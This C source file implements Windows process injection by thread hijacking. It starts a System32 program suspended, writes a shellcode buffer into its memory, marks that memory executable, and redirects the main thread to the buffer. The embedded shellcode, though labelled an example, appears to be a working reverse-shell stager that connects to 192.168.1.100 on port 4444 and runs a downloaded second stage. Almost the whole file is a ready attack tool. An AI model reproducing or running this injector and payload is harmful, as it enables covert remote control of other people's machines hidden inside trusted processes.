#include "Functions.h"

// Function to create a suspended process
BOOL CreateSuspendedProcess(IN LPCSTR ProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
    CHAR WnDr[MAX_PATH];
    CHAR lpPath[MAX_PATH * 2];
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    si.cb = sizeof(STARTUPINFO); // Initialize the cb field in STARTUPINFO

    // Get WINDIR environment variable
    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        warning("GetEnvironmentVariable failed, error: 0x%lx\n", GetLastError());
        return FALSE;
    }

    okay("We got the environment variable.\n");

    // Create the full target path for the process
    sprintf_s(lpPath, "%s\\System32\\%s", WnDr, ProcessName);
    info("Running: %s\n", lpPath);

    // Create the process in suspended mode
    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)) {
        warning("Failed to create process, error: 0x%lx\n", GetLastError());
        return FALSE;
    }

    info("Process created successfully.\n");

    // Set the output parameters
    *dwProcessId = pi.dwProcessId;
    *hProcess = pi.hProcess;
    *hThread = pi.hThread;

    // Ensure all handles are valid
    if (*dwProcessId != 0 && *hProcess != NULL && *hThread != NULL) {
        return TRUE;
    }
    return FALSE;
}

// Function to inject shellcode into the remote process
BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {
    SIZE_T sNumberOfBytesWritten = 0;
    DWORD dwOldProtection = 0;

    // Allocate memory in the remote process
    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        warning("VirtualAllocEx failed, error: %d\n", GetLastError());
        return FALSE;
    }

    info("Allocated memory at: 0x%p\n", *ppAddress);

    // Write the shellcode into the allocated memory
    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        warning("WriteProcessMemory failed, error: %d\n", GetLastError());
        return FALSE;
    }

    // Change the memory protection to execute the shellcode
    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        warning("VirtualProtectEx failed, error: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

// Function to hijack the thread and point it to the injected shellcode
BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {

    CONTEXT ThreadCtx;
    ThreadCtx.ContextFlags = CONTEXT_CONTROL;

    // Get the original thread context
    if (!GetThreadContext(hThread, &ThreadCtx)) {
        warning("GetThreadContext failed with error: %d\n", GetLastError());
        return FALSE;
    }

    // Update the instruction pointer to point to the shellcode
#ifdef _WIN64
    ThreadCtx.Rip = (DWORD64)pAddress;  // x64 architecture
#else
    ThreadCtx.Eip = (DWORD32)pAddress;  // x86 architecture
#endif

    // Set the new thread context
    if (!SetThreadContext(hThread, &ThreadCtx)) {
        warning("SetThreadContext failed with error: %d\n", GetLastError());
        return FALSE;
    }

    // Resume the suspended thread, executing our payload
    ResumeThread(hThread);
    WaitForSingleObject(hThread, INFINITE);
    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        warning("Usage: %s <ProcessName>\n", argv[0]);
        return -1;
    }

    DWORD processId;
    HANDLE hProcess, hThread;

    // Create the suspended process
    if (CreateSuspendedProcess(argv[1], &processId, &hProcess, &hThread)) {
        okay("Process created with PID: %lu\n", processId);

        // Example shellcode (replace with actual shellcode)
        unsigned char shellcode[] =
            "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
            "\x52\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"
            "\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f"
            "\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
            "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41"
            "\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
            "\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
            "\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49"
            "\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6"
            "\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
            "\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
            "\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
            "\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
            "\x5e\x59\x48\x01\xd0\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
            "\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
            "\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
            "\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
            "\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x01\x64\x41\x54"
            "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
            "\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
            "\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
            "\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
            "\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
            "\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
            "\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
            "\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
            "\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
            "\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
            "\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
            "\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
            "\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
            "\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
            "\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
            "\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
            "\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
            "\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
            "\xf0\xb5\xa2\x56\xff\xd5";
        SIZE_T shellcodeSize = sizeof(shellcode);
        PVOID pRemoteAddress = NULL;

        // Inject shellcode
        if (InjectShellcodeToRemoteProcess(hProcess, shellcode, shellcodeSize, &pRemoteAddress)) {
            info("Shellcode injected at: 0x%p\n", pRemoteAddress);

            // Hijack the thread to point to the injected shellcode
            if (HijackThread(hThread, pRemoteAddress)) {
                okay("Thread hijacked and shellcode executed successfully.\n");
            }
            else {
                warning("Failed to hijack the thread.\n");
            }
        }
        else {
            warning("Failed to inject shellcode.\n");
        }

        // Close handles
        CloseHandle(hProcess);
        CloseHandle(hThread);
    }
    else {
        warning("Failed to create suspended process.\n");
    }

    return 0;
}
